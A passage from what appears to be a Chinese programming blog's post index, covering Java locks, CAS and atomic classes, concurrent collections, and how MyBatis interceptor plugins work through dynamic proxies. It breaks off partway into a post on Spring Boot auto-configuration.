死锁描述了线程等待获得自己或对方已拥有的锁的僵持状态。\n防止死锁的有效方案如下：\n 设置线程尝试获得锁的超时时间。 每个线程尝试获得多个资源的锁的顺序必须一致。  比如上图，线程 1 和线程 2 都需要获得资源 1 和资源 2 的锁，只要每个线程尝试获得资源的锁的顺序是 (1，2)，也就不会是僵局。\n惯用锁 除了 synchronized，JDK 提供的 java.util.concurrent 包，富有参差多态的锁。\nReentrantLock ReentrantLock，可译为重入锁。重入（reentrant）是指一个线程可以再次拥有它已拥有且未释放的锁。通过上文“偏向锁和轻量级锁以及重量级锁”，可以知道内置锁是可重入锁。\n1 2 3 4 5 6 7 8 9 10 11  public class Foobar { public synchronized void doSomething() { System.out.println(\u0026#34;do something\u0026#34;); doOtherThings(); } public synchronized void doOtherThings() { System.out.println(\u0026#34;do other things\u0026#34;); } }   如上代码所示，当一个线程用 Foobar 对象调用 doSomething 方法，成功获得该对象的内置锁后，继续调用 doOther 方法时，假设内置锁不是重入锁，那么因为 doSomething 方法还未返回，所以该对象的内置锁还未自动释放，那么该线程将被迫无限期等待。\n或者断言该线程调用以下方法不会引起 java.lang.StackOverflowError 异常：\n1 2 3 4 5 6  public class Foobar { public synchronized void doSomething() { doSomething(); } }   事实证明，以上断言都是错的。ReentrantLock 的一般用法如下：\n1  final Lock lock = new ReentrantLock();   1 2 3 4 5 6  lock.lock(); try { // critical section } finally { lock.unlock(); }   相比于 synchronized，Lock 要求显式锁定（lock）和解锁（unlock），因此要特别注意即使发生异常也要释放锁。如果不希望线程获得锁失败后等待机会而是继续前行或者需要返回结果，可以使用以下的方法：\n  boolean tryLock();\n  boolean tryLock(long time, TimeUnit unit) throws InterruptedException;\n  一个典型的用法可能是这样的：\n1 2 3 4 5 6 7 8 9  if (lock.tryLock()) { try { // manipulate protected state  } finally { lock.unlock(); } } else { // perform alternative actions }   ReadWriteLock ReadWriteLock，“读读共享，读写（写读）互斥，写写互斥”。\n1  final ReadWriteLock readWriteLock = new ReentrantReadWriteLock();   1  Lock readLock = readWriteLock.readLock();   1  Lock writeLock = readWriteLock.writeLock();   readLock 和 writeLock 类似于共享锁和排他锁。\nSemaphore Semaphore，翻译为信号量，也可实现锁。\n1  final Semaphore semaphore = new Semaphore(3);   1  semaphore.acquire();   1  semaphore.release();   如上所示，在同一时刻，最多只能有 3 个线程获得锁成功。\n分类目录 下面这张图来自美团技术团队，描述了 Java 主流锁的分类目录：\n多线程竞争锁时，抢不到锁的线程，可能被迫等待（等待通知），或被阻塞（等待获得锁），抑或自旋。\n协调 CountDownLatch CountDownLatch，一个安全的且只能递减的计数器，支持一个线程等待多个线程完成任务后恢复执行。\n1  final CountDownLatch latch = new CountDownLatch(2);   1  latch.countDown();   1  latch.await(3000, TimeUnit.MILLISECONDS);   如上所示，主线程调用 await 方法被迫等待，除非设置了超时时间，否则直到最后一个子线程完成任务后调用 countDown 方法把 latch 的次数减少为 0 时，才能继续前行。\nCyclicBarrier CyclicBarrier，调用 await 方法的线程被迫等待，直到给定数量的线程都到达“栅栏”，同时起跑。\n1  final CyclicBarrier barrier = new CyclicBarrier(8);   1  barrier.await();   AQS 它们最亲近的父类是 AbstractQueuedSynchronizer。\n原子 保证多线程并发访问共享变量的程序正确，有另一个解决方案——原子操作。\n原子访问 在 Java 中，对以下变量的读取或写入都属于原子访问（atomic access）：\n  引用类型的变量和大部分原始类型的变量（除了 long 和 double 的所有类型）。\n  声明为 volatile 的所有变量（包括 long 和 double 变量）。\n  原子访问是指不可分且不可中断的操作，原子访问要么完全发生，要么根本不发生。虽然单一原子访问避免了线程干扰，但是不代表一组原子访问可以防止内存一致性错误。\n使用 volatile 可降低内存一致性错误的风险，因为任何对 volatile 变量的写入都会与该变量的后续读取建立先发生在前的关系（happens-before relationship）。换言之，对 volatile 变量的更改始终对其它线程可见，即线程读取的 volatile 变量总是最新的。从 The Java Virtual Machine Specification, Java SE 8 Edition # 4.5. Fields 可以发现，ACC_VOLATILE 这个 flag 解释为 volatile 变量无法缓存，只要 JVM 遵循了这个规范项，则线程只会从主存中读取而不是从其它高速缓存。volatile 另一个作用是避免指令重排导致线程对变量的修改不可见，因为现在的 HotSpot VM 默认开启了 JIT 编译器（Just-in-time compiler），在运行时 JIT 可能应用指令重排优化。\n回想前文所讨论的“非线程安全”中的计数器（Counter），非同步的“当前值加一”分解出来的三个步骤是原子访问，但是试验证明，出现了相互覆盖或丢失修改。由上一段可知，即使使用 volatile 修饰 Counter 的 count 字段，非同步的“当前值加一”仍然会出现内存一致性错误。\n到此为止，难道只能使用 synchronized 或 Java 锁防止线程干扰和内存一致性错误？然而并不是，还有一种 volatile 变量组合 CAS 循环的方案，其实前面”惯用锁“中所说的 ReentrantLock 的实现也使用了 CAS。\nCAS 在“锁”中第一次提到了 compare-and-swap 这个指令，而在“偏向锁和轻量级锁以及重量级锁”中也提到了 CAS。CAS 的实现通常需要硬件层的支持，甚至可能在硬件层见到类似于软件层的锁概念。\n现在用全新的 AtomicCounter 来代替那个混杂的 Counter。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  public class AtomicCounter { private AtomicLong count = new AtomicLong(0); public void increment() { long current, next; while (true) { current = count.get(); next = current + 1; if (count.compareAndSet(current, next)) { return; } } } public long value() { return count.get(); } }     使用 AtomicLong 代替 long，它维护了一个用 volatile 修饰的 long 字段。\n  使用核心是 CAS 的方法（CAS 循环）代替使用 synchronized 的方法。\n  其中新的 increment 方法的循环体内的前两个步骤和在 “非线程安全” 所分解的前两个步骤是一致的，第三个步骤是关键：\n1  count.compareAndSet(current, next)   当有多个线程并发调用 increment 方法，到了第三个步骤，某一个线程比较 count 绑定的字段与它前一次读取的 current 变量是否相等，如果相等，则把 count 绑定的字段的值设为 next 的值，increment 方法返回，如果不相等，则表明 count 绑定的字段已被其它线程修改，compareAndSet 方法返回 false，跳到第一步，继续尝试。竞争足够激烈时，相比于 synchronized，volatile 变量组合 CAS 循环是非阻塞方案。\ncompareAndSet 方法看似可分为两个步骤，实际上在底层，它是一个不可分且不可中断的原子指令，即从比较开始到赋值结束有且只有一个线程在执行此任务。该方法之所以可能返回 false，则是因为有可能一个线程赋值结束，与此同时，另一个线程开始比较。\n同样，也给 AtomicCounter 写测试类，这一次线程加一，次数加一百万。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  public class AtomicCounterTest { private static final long wait = 3000; private final long threads = 3; private final long times = 2000000; private final long excepted = threads * times; @Test public void testIncrement() throws InterruptedException { AtomicCounter counter = new AtomicCounter(); startThreads(counter, () -\u0026gt; { for (int j = 0; j \u0026lt; times; j++) { counter.increment(); } System.out.printf(\u0026#34;threadName: %s, counterValue: %s\\n\u0026#34;, Thread.currentThread().getName(), counter.value()); }); Assert.assertEquals(excepted, counter.value()); } private void startThreads(AtomicCounter counter, Runnable runnable) throws InterruptedException { for (int i = 0; i \u0026lt; threads; i++) { new Thread(runnable).start(); } Thread.sleep(AtomicCounterTest.wait); System.out.printf(\u0026#34;threadName: %s, exceptedCounterValue: %s, actualCounterValue: %s\\n\u0026#34;, Thread.currentThread().getName(), excepted, counter.value()); } }   结果果然正确：\n事实上，JDK 已经提供了许多操作原子类型实例的原子方法，上文最新版的“当前值加一”方法过于啰嗦，实际开发中请直接使用原子类的 incrementAndGet 方法。翻阅源码可以知道，原子类的 compareAndSet 方法使用了 sun.misc.Unsafe 的 compareAndSwap 方法：\n1 2 3 4 5  public final native boolean compareAndSwapObject(Object var1, long var2, Object var4, Object var5); public final native boolean compareAndSwapInt(Object var1, long var2, int var4, int var5); public final native boolean compareAndSwapLong(Object var1, long var2, long var4, long var6);   注意其中的 native，也就是说，下层的 compareAndSwap 函数由 C/C++ 实现，而 Java 程序可通过 JNI 调用这个函数。 虽然 JDK 没有包含 sun.misc.Unsafe 的源文件，但是通过对 Unsafe.class反编译，可以确定 incrementAndGet 方法同样使用了 CAS 函数，并且也使用 CAS 循环。\n1 2 3  public final long incrementAndGet() { return unsafe.getAndAddLong(this, valueOffset, 1L) + 1L; }   1 2 3 4 5 6 7 8  public final long getAndAddLong(Object var1, long var2, long var4) { long var6; do { var6 = this.getLongVolatile(var1, var2); } while(!this.compareAndSwapLong(var1, var2, var6, var6 + var4)); return var6; }   注意，上文讨论的计数器在高并发场景中不一定是最优的方案，请看 LongAdder 和 LongAccumulator。\n原子类 这个 java.util.concurrent.atomic 包定义了支持对单个变量进行原子操作的类。\n值得注意的是，AtomicReference* 用于防止多线程并发操作引用类型实例出现线程干扰和内存一致性错误。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  public class LinkedList\u0026lt;Item\u0026gt; { private Node\u0026lt;Item\u0026gt; first; static class Node\u0026lt;Item\u0026gt; { Item item; Node\u0026lt;Item\u0026gt; next; } public void push(Item item) { Node\u0026lt;Item\u0026gt; oldFirst = first; first = new Node\u0026lt;\u0026gt;(); first.item = item; first.next = oldFirst; } }   如上所示，一个简略的链表（LinkedList），维护了一个首结点（first），push 方法用于在链表表头插入结点，当多线程并发调用同一个 LinkedList 实例的 push 方法时，它们存储了各自的老首结点（NodeoldFirst = first;），它们新建了各自的新首结点（new Node\u0026lt;\u0026gt;();），然后把 first 指向各自的结点（first = new Node\u0026lt;\u0026gt;();），因为 first 是它们的共享变量，所以可能已经出现相互覆盖或丢失修改，更不用说后面了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  public class LinkedList\u0026lt;Item\u0026gt; { private Node\u0026lt;Item\u0026gt; first; static class Node\u0026lt;Item\u0026gt; { Item item; Node\u0026lt;Item\u0026gt; next; } public void push(Item item) { Node\u0026lt;Item\u0026gt; oldFirst = first; Node\u0026lt;Item\u0026gt; newFirst = new Node\u0026lt;\u0026gt;(); newFirst.item = item; newFirst.next = oldFirst; first = newFirst; } }   再如上所示，为了使问题清晰，只在 push 方法最后一步才设置 first。同样也因为 first 是它们的共享变量，所以它们都执行完最后一步后，可能出现一个或多个线程的新首结点游离于链表之外，因此，改用 CAS 方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  public class AtomicLinkedList\u0026lt;Item\u0026gt; { private AtomicReference\u0026lt;Node\u0026lt;Item\u0026gt;\u0026gt; first = new AtomicReference\u0026lt;\u0026gt;(); static class Node\u0026lt;Item\u0026gt; { Item item; Node\u0026lt;Item\u0026gt; next; } public void push(Item item) { Node\u0026lt;Item\u0026gt; newFirst = new Node\u0026lt;\u0026gt;(); newFirst.item = item; Node\u0026lt;Item\u0026gt; oldFirst; while (true) { oldFirst = first.get(); newFirst.next = oldFirst; if (first.compareAndSet(oldFirst, newFirst)) { return; } } } }   如果还实现了删除结点的方法，则要小心 ABA 问题，这时可考虑使用 AtomicStampedReference。\nCollections BlockingQueue 线程级的生产者-消费者问题的实质是分为生产者和消费者的两组线程共享同一个队列，消费者暂不能从队列拉取元素，除非队列非空，生产者暂不能推送元素到队列，除非队列非满。BlockingQueue 既有基于数组的实现，也有基于链表的实现，可用来解决生产者-消费者问题（比如 BlockingQueueDemo），当阻塞队列为空时，线程从阻塞队列拉取元素时会被阻塞或被迫等待，当阻塞队列已满时，线程推送元素到阻塞队列会被阻塞或被迫等待。\nLinkedBlockingDeque 和 ArrayBlockingQueue 均使用了 Condition，维护了队列非满条件变量和队列非空条件变量，如下图所示，通知的实现基于上文 \u0026ldquo;通知\u0026rdquo; 中提到的 park/unpark。\n本质上，Condition 实例与 Lock 实例绑定，通过 Lock 实例的 newCondition 方法可新建 Condition 实例。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  class BoundedBuffer { final Lock lock = new ReentrantLock(); final Condition notFull = lock.newCondition(); final Condition notEmpty = lock.newCondition(); final Object[] items = new Object[100]; int putptr, takeptr, count; public void put(Object x) throws InterruptedException { lock.lock(); try { while (count == items.length) notFull.await(); items[putptr] = x; if (++putptr == items.length) putptr = 0; ++count; notEmpty.signal(); } finally { lock.unlock(); } } public Object take() throws InterruptedException { lock.lock(); try { while (count == 0) notEmpty.await(); Object x = items[takeptr]; if (++takeptr == items.length) takeptr = 0; --count; notFull.signal(); return x; } finally { lock.unlock(); } } }   ConcurrentMap ConcurrentMap 是 Map 的子接口，它定义了有用的原子操作，例如，仅在键存在时才删除或替换键值对，或仅在键不存在时才添加键值对，其中一个标准实现是 ConcurrentHashMap，它是 HashMap 的线程安全版本。\nJDK 7 的 HashMap 是基于拉链法的散列表。\n如上面这张来自 algs4 的图所示，散列表是一种符号表（symbol table），符号表是一种存储键值对的数据结构，支持两种操作：\n  插入（put）。查找给定的键是否命中，若命中，则更新对应的值，若未命中，则插入键值对。\n  查找（get）。通过给定的键得到相应的值。\n  基于拉链法的散列表维护了元素类型是链表的数组，它的查找算法可分为两步：\n  使用 Hash 函数将给定的键转化为数组的索引。\n  在链表中查找给定的键，返回对应的值。\n  如下面这张来自 Java HashMap internals 的图所示，在 HashMap 中，数组元素称为 bucket 或 bin，链表结点称为 entry。\nJDK 8 在 HashMap 中引入红黑树以优化查找算法。当一个桶的大小（链表大小）大于等于树化阈值（TREEIFY_THRESHOLD）且桶的数量（数组长度）大于等于 64，该桶将转化为一颗红黑树，当一个桶的大小小于等于解树阈值（TREEIFY_THRESHOLD），该桶将转化为链表。说到红黑二叉查找树，不得不先说二叉查找树和 2-3 查找树，未来将开启 HashMap 的新篇章。\n翻阅源码可以知道，例如 ConcurrentHashMap#put 方法，ConcurrentHashMap 使用 CAS 和 synchronized 防止多线程并发访问它维护的链表或红黑树时出现线程干扰和内存一致性错误。\n一成不变 如果一个共享对象的状态只读，就不存在线程干扰和内存一致性错误，而且只要尝试改写状态时，每次都新建不同状态的这种对象并返回，完美制造了状态可变的假象（想象一下手翻书），也就不存在线程安全问题。这种对象，被称为不可变对象（Immutable Objects）。定义不可变对象的策略，可参考 A Strategy for Defining Immutable Objects。\n《The Joy of Clojure, second-edition》，1.4. Why Clojure isn’t especially object-oriented，作者对不可变的和可变的做了很棒的类比。\n后记 单机可以运行数百万个 Go 协程（Goroutine），却只能运行数千个 Java 线程。现在的 Java HotSpot VM，默认一个 Java 线程占有 1 M 的栈（以前是 256K），而且是大小固定的栈，而 Go 协程的栈是大小可变的栈，即随着存储的数据量变化而变化，并且初始值仅为 4 KB。确实，运行过多的 Java 线程容易导致 out of memory，而且 Java 线程与内核线程（原生线程）是 1:1 映射，那么过多线程的上下文切换也会引起应用程序较大延迟；Go 协程与内核线程（原生线程）是多对一映射，Go 实现了自己的协程调度器，实际上要运行数百万个协程，Go 需要做得事情要复杂得多。\n若只讨论 Java 单体应用承受高并发的场景，即使扩大线程池也不能显著提高性能或适得其反，相反，少量的线程就能处理更多的连接，比如，Netty。如果仍然认为重量级的 Java 线程是瓶颈，并且还想使用 Java 的话，不妨尝试 Quasar，它是一个提供纤程和类似于 Go 的 Channel 以及类似于 Erlang 的 Actor 的 Java 库。\n虽然进程之间不一定共享本机资源，但是线程之间的同步可以推广到进程之间的同步，比如，分布式锁。分布式系统中，代码一致的多个进程可能共享同一个数据库，数据库支持并发控制，比如，共享锁和排他锁以及 MVCC。\n文中代码 部分代码已发布，可查看 concurrent。\n 本文首发于 https://h2cone.github.io\n 吸收更多   深入理解计算机系统（原书第3版）\n  Thread (computing)\n  ~jbell/CourseNotes/OperatingSystems/4_Threads\n  Implementing threads :: Operating systems 2018\n  HotSpot Runtime Overview # Thread Management\n  JVM中的线程模型是用户级的么？\n  How Java thread maps to OS thread\n  HotSpot JVM internal threads\n  Java Tutorials # Concurrency # Guarded Blocks\n  Thread pool\n  Java Tutorials # Concurrency # Thread Pools\n  Java Tutorials # Concurrency # Fork/Join\n  Fork–join model\n  Java Tutorials # Collections # Streams # Parallelism\n  Java Tutorials # Concurrency # Synchronization\n  The Java Language Specification, Java SE 8 Edition # Chapter 17. Threads and Locks\n  HotSpot Runtime Overview # Synchronization\n  OpenJDK Wiki # HotSpot # Synchronization and Object Locking\n  The Java Virtual Machine Specification, Java SE 8 Edition # 2.11.10. Synchronization\n  The Hotspot Java Virtual Machine by Paul Hohensee\n  【死磕Java并发】\u0026mdash;\u0026ndash;深入分析synchronized的实现原理\n  Lock Lock Lock: Enter!\n  Inside the Java Virtual Machine by Bill Venners # Thread Synchronization\n  Biased Locking in HotSpot\n  HotSpotGlossary\n  Lock (computer science)\n  Mutual exclusion\n  Synchronization (computer science)\n  Monitor (synchronization)\n  Understand the object internally\n  单例模式\u0026ndash;双重检验锁真的线程安全吗\n  Know Thy Java Object Memory Layout\n  【基本功】不可不说的Java“锁”事\n  码农翻身：用故事给技术加点料\n  Java Tutorials # Concurrency # Atomic Access\n  Java Tutorials # Concurrency # Atomic Variables\n  聊聊并发（五）——原子操作的实现原理\n  Java Tutorials # Concurrency\n  唯品会 Java 开发手册 (九) 并发处理\n  Why you can have millions of Goroutines but only thousands of Java Threads\n  Java中的纤程库 - Quasar\n  继续了解Java的纤程库 - Quasar\n  The actor model in 10 minutes - Brian Storti\n  ","date":"2020-02-21T17:47:30+08:00","permalink":"https://h2cone.github.io/2020/02/21/thread_concurrent/","title":"多线程·并发编程"},{"content":"插件 我们早已知道 MyBatis 自身支持客户端分页（RowBounds）, 即从数据库获取全部目标数据，在内存中对结果集进行分页，虽然适用于不同数据库，但是数据量足够大时 Java 程序可能发生内存溢出；若采用数据库服务器端分页，即从数据库获取部分目标数据，例如向 MySQL 数据库发送使用了 LIMIT 或 OFFSET关键词的 SQL，还挺简单，可是直接使用 MyBatis 做数据库分页仍然有一些痛点：\n  重复编写分页、求总记录数、排序语句。\n  语法不同，不适用于其它数据库。\n  那不如改用 Hibernate ？还真不一定，国人偏爱 MyBatis，以至于使用插件来增强 MyBatis，比如 Mybatis-PageHelper，一个通用的 MyBatis 分页插件。想不到 MyBatis 还挺灵活，支持插件机制。仔细翻阅官方文档可以确定 MyBatis 允许你在 Mapper 执行过程中的某些点拦截调用，已经知晓动态代理的朋友们（参见切面和动态代理以及字节码），彷佛看透了 MyBatis 插件。\n默认情况下，MyBatis 允许插件拦截以下方法的调用：\n   Classes Methods     Executor update, query, flushStatements, commit, rollback, getTransaction, close, isClosed   ParameterHandler getParameterObject, setParameters   ResultSetHandler handleResultSets, handleOutputParameters   StatementHandler prepare, parameterize, batch, update, query    顾名思义，MyBatis 不愧为 SQL 映射框架。这些重要的组件共同参与了 MyBatis 一般的工作流程：\n示例插件 编写一个插件，只需要实现 org.apache.ibatis.plugin.Interceptor 接口，指定你要拦截的方法签名。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  @Intercepts({ @Signature( type = Executor.class, method = \u0026#34;query\u0026#34;, args = {MappedStatement.class, Object.class, RowBounds.class, ResultHandler.class} ) }) public class ExamplePlugin implements Interceptor { @Override public Object intercept(Invocation invocation) throws Throwable { System.out.println(\u0026#34;implement pre-processing if needed\u0026#34;); Object result = invocation.proceed(); System.out.printf(\u0026#34;result: %s\\n\u0026#34;, result); System.out.println(\u0026#34;implement post-processing if needed\u0026#34;); return result; } @Override public void setProperties(Properties properties) { System.out.printf(\u0026#34;properties: %s\\n\u0026#34;, properties); } }   @Intercepts 必不可少，其中 @Signature 声明方法签名数组，上面这个简单的插件用于拦截 Executor 的参数类型列表为 (MappedStatement.class, Object.class, RowBounds.class, ResultHandler.class) 的 query 方法，在此方法调用前做预处理，在此方法调用后做后处理。\n拦截 Executor 的 query 方法是否真能对 Mapper 方法调用起作用？且让我们先在 mybatis-config.xml 中声明自定义插件：\n1 2 3 4 5  \u0026lt;plugins\u0026gt; \u0026lt;plugin interceptor=\u0026#34;io.h2cone.mybatis.interceptor.ExamplePlugin\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;someProperty\u0026#34; value=\u0026#34;1024\u0026#34;/\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt;   准备一个简单的 Mapper，模拟通过省区代码查询城市列表：\n1 2 3 4 5 6  public interface CityMapper { @Select(\u0026#34;select * from city where province_code = #{provinceCode}\u0026#34;) List\u0026lt;City\u0026gt; selectCities(String provinceCode); }   编写用例测试一下我们的插件：\n1 2 3 4 5 6 7 8 9 10 11 12  @Test public void testExamplePlugin() throws IOException { String resource = \u0026#34;mybatis-config.xml\u0026#34;; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); try (SqlSession session = sqlSessionFactory.openSession()) { CityMapper mapper = session.getMapper(CityMapper.class); List\u0026lt;City\u0026gt; cities = mapper.selectCities(\u0026#34;000000\u0026#34;); Assert.assertNotNull(cities); } }   运行测试代码输出如下：\n1 2 3 4  properties: {someProperty=1024} implement pre-processing if needed result: [] implement post-processing if needed   可见我们的预处理和后处理成功插入了 Mapper 方法调用之前和之后，完整代码请看 mybatis-interceptor。\n知其所以然 MyBatis 如何实现插件？瞧瞧 MyBatis 源码也许能找到答案。先从 testExamplePlugin 这个测试方法开始，从表面上看，分成几步：\n  加载 XML 配置文件\n  从 XML 构建 SqlSessionFactory\n  使用 SqlSessionFactory 打开 SqlSession\n  查询数据库\n  解析 XML 配置后加载插件是否发生在第二步？层层探索源码之后，留下了一些蛛丝马迹：\n  org.apache.ibatis.session.SqlSessionFactoryBuilder#build(java.io.InputStream)\n  org.apache.ibatis.session.SqlSessionFactoryBuilder#build(java.io.InputStream, java.lang.String, java.util.Properties)\n  org.apache.ibatis.builder.xml.XMLConfigBuilder#XMLConfigBuilder(java.io.InputStream, java.lang.String, java.util.Properties)\n  org.apache.ibatis.builder.xml.XMLConfigBuilder#XMLConfigBuilder(org.apache.ibatis.parsing.XPathParser, java.lang.String, java.util.Properties)\n  org.apache.ibatis.builder.xml.XMLConfigBuilder#parse\n  org.apache.ibatis.builder.xml.XMLConfigBuilder#parseConfiguration\n  org.apache.ibatis.builder.xml.XMLConfigBuilder#pluginElement\n  org.apache.ibatis.session.Configuration#addInterceptor\n  org.apache.ibatis.plugin.InterceptorChain#addInterceptor\n  org.apache.ibatis.plugin.InterceptorChain#addInterceptor\n  由此看来，自定义插件会添加到 org.apache.ibatis.plugin.InterceptorChain#interceptors：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  public class InterceptorChain { private final List\u0026lt;Interceptor\u0026gt; interceptors = new ArrayList\u0026lt;\u0026gt;(); public Object pluginAll(Object target) { for (Interceptor interceptor : interceptors) { target = interceptor.plugin(target); } return target; } public void addInterceptor(Interceptor interceptor) { interceptors.add(interceptor); } public List\u0026lt;Interceptor\u0026gt; getInterceptors() { return Collections.unmodifiableList(interceptors); } }   这种设计是 Chain-of-responsibility pattern。注意 pluginAll 方法，终于还是回到了 Interceptor:\n1 2 3 4 5 6 7 8 9 10 11 12 13  public interface Interceptor { Object intercept(Invocation invocation) throws Throwable; default Object plugin(Object target) { return Plugin.wrap(target, this); } default void setProperties(Properties properties) { // NOP  } }   注意 plugin 方法，再点开 org.apache.ibatis.plugin.Plugin#wrap 方法，果然 MyBatis 插件基于 JDK 动态代理来实现：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  public class Plugin implements InvocationHandler { private final Object target; private final Interceptor interceptor; private final Map\u0026lt;Class\u0026lt;?\u0026gt;, Set\u0026lt;Method\u0026gt;\u0026gt; signatureMap; private Plugin(Object target, Interceptor interceptor, Map\u0026lt;Class\u0026lt;?\u0026gt;, Set\u0026lt;Method\u0026gt;\u0026gt; signatureMap) { this.target = target; this.interceptor = interceptor; this.signatureMap = signatureMap; } public static Object wrap(Object target, Interceptor interceptor) { Map\u0026lt;Class\u0026lt;?\u0026gt;, Set\u0026lt;Method\u0026gt;\u0026gt; signatureMap = getSignatureMap(interceptor); Class\u0026lt;?\u0026gt; type = target.getClass(); Class\u0026lt;?\u0026gt;[] interfaces = getAllInterfaces(type, signatureMap); if (interfaces.length \u0026gt; 0) { return Proxy.newProxyInstance( type.getClassLoader(), interfaces, new Plugin(target, interceptor, signatureMap)); } return target; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { try { Set\u0026lt;Method\u0026gt; methods = signatureMap.get(method.getDeclaringClass()); if (methods != null \u0026amp;\u0026amp; methods.contains(method)) { return interceptor.intercept(new Invocation(target, method, args)); } return method.invoke(target, args); } catch (Exception e) { throw ExceptionUtil.unwrapThrowable(e); } } ...   如代码所说，把插件要拦截的方法所属的类的实例当作被代理（target），满足条件时生成了代理（proxy）。举例来说，Executor 接口的实现类都是被代理类，它们对应的代理类都实现了 Executor，一旦 Executor 的实现类的方法被调用时，偷天换日，实际调用的则是 org.apache.ibatis.plugin.Plugin#invoke 方法，其中调用了 ExamplePlugin 重写的intercept 方法，因此，我们才能在 Executor 实现类方法调用前后插入预处理和后处理。\n那么，org.apache.ibatis.plugin.InterceptorChain#pluginAll 方法什么时候被调用？继续深入测试代码第三步的源代码：\n  org.apache.ibatis.session.SqlSessionFactory#openSession()\n  org.apache.ibatis.session.defaults.DefaultSqlSessionFactory#openSession()\n  org.apache.ibatis.session.defaults.DefaultSqlSessionFactory#openSessionFromDataSource\n  org.apache.ibatis.session.Configuration#newExecutor(org.apache.ibatis.transaction.Transaction, org.apache.ibatis.session.ExecutorType)\n  org.apache.ibatis.plugin.InterceptorChain#pluginAll\n  当然，我们也可以利用 IntelliJ IDEA CE 的代码分析功能，查一下哪里使用了 pluginAll 方法：\n从终点出发，回到了起点。\n尾声 大胆猜想一下，分页插件是通过拦截 StatementHandler 的 query 等方法，取得 SQL，改写 SQL 使其能够分页、求总记录数、排序。除了分页，MyBatis 插件理所当然可以做慢 SQL 监控、水平分表、数据加密和解密、菜单权限控制\u0026hellip;\u0026hellip;\n 本文首发于 https://h2cone.github.io\n 参考资料   MyBatis: plug-ins\n  Mybatis之plugin插件设计原理\n  MyBatis插件原理\n  MyBatis: getting started\n  MybatisAutoConfigurationTest\n  I can not config my interceptors in application.yml\n  plugins-package option for application.yml\n  Plug-in (computing)\n  ","date":"2020-02-08T18:28:19+08:00","permalink":"https://h2cone.github.io/2020/02/08/your-own-mybatis-interceptor/","title":"造你自己的 MyBatis 插件"},{"content":"自动配置 遥想以前，Spring 集成其它模块往往需要大量的 XML 配置和 Java 配置，经历过 SSM（Spring、Spring MVC、MyBatis）或者 SSH（Struts、Spring、Hibernate）框架搭建和填空的人们应该深有体会，特别费时费力，直到 Spring Boot 的流行才有所改善。\nSpring Boot 简化配置，开箱即用，得益于自动配置（auto-configuration）。开启了自动配置的 Spring Boot 程序会尝试猜测和配置我们可能需要的 Bean。如果我们给一般的 Spring Boot Web 程序（添加了 spring-boot-starter-web 依赖的 Spring Boot 程序）关联的 application.yml 文件增加一行：\n1  debug:true  程序启动成功后，可以在控制台观察到一段叫做 CONDITIONS EVALUATION REPORT 的冗长日志，下面截取若干部分：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  ============================ CONDITIONS EVALUATION REPORT ============================ Positive matches: ----------------- ... EmbeddedWebServerFactoryCustomizerAutoConfiguration.TomcatWebServerFactoryCustomizerConfiguration matched: - @ConditionalOnClass found required classes \u0026#39;org.apache.catalina.startup.Tomcat\u0026#39;, \u0026#39;org.apache.coyote.UpgradeProtocol\u0026#39; (OnClassCondition) ... Negative matches: ----------------- ... EmbeddedWebServerFactoryCustomizerAutoConfiguration.JettyWebServerFactoryCustomizerConfiguration: Did not match: - @ConditionalOnClass did not find required classes \u0026#39;org.eclipse.jetty.server.Server\u0026#39;, \u0026#39;org.eclipse.jetty.util.Loader\u0026#39;, \u0026#39;org.eclipse.jetty.webapp.WebAppContext\u0026#39; (OnClassCondition) EmbeddedWebServerFactoryCustomizerAutoConfiguration.NettyWebServerFactoryCustomizerConfiguration: Did not match: - @ConditionalOnClass did not find required class \u0026#39;reactor.netty.http.server.HttpServer\u0026#39; (OnClassCondition) EmbeddedWebServerFactoryCustomizerAutoConfiguration.UndertowWebServerFactoryCustomizerConfiguration: Did not match: - @ConditionalOnClass did not find required classes \u0026#39;io.undertow.Undertow\u0026#39;, \u0026#39;org.xnio.SslClientAuthMode\u0026#39; (OnClassCondition) ... Exclusions: ----------- None Unconditional classes: ---------------------- org.springframework.boot.autoconfigure.context.ConfigurationPropertiesAutoConfiguration org.springframework.boot.actuate.autoconfigure.info.InfoContributorAutoConfiguration ...   这份报告分为四个部分：Positive matches、Negative matches、Exclusions、Unconditional classes，顾名思义，对于这个程序内嵌的应用服务器，只有 Tomcat 的配置类是匹配的，而 Jetty、Undertow、Netty 的配置类均不匹配，它们共同的外部类则是一个自动配置类：EmbeddedWebServerFactoryCustomizerAutoConfiguration，这就是 Spring Boot 提供的内嵌应用服务器的自动配置。\n自动配置类满足一些条件时，即匹配，框架就自动进行了配置，例如，如果你在 classpath 上有 tomcat-embedded.jar，你可能想要一个 TomcatServletWebServerFactory bean，除非你定义了自己的 ServletWebServerFactory bean。\n不出意外，Spring Web 模块需要配置的 Dispatcher Servlet、数据库操作需要配置的数据源等等，Spring Boot 都提供了基础的配置（参见 Spring Boot 源码的 spring.factories 文件），通常，用户只需要添加对应的依赖，简单声明一下，开箱即用，即使默认配置不满足后期需求，也支持覆盖或重写。\n自定义吧 自动配置是通过使用 @Configuration 注解的类来实现，其它诸如 @Conditional 的注解用于约束何时应用自动配置（是否匹配）。比如下面这个自定义的自动配置类：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 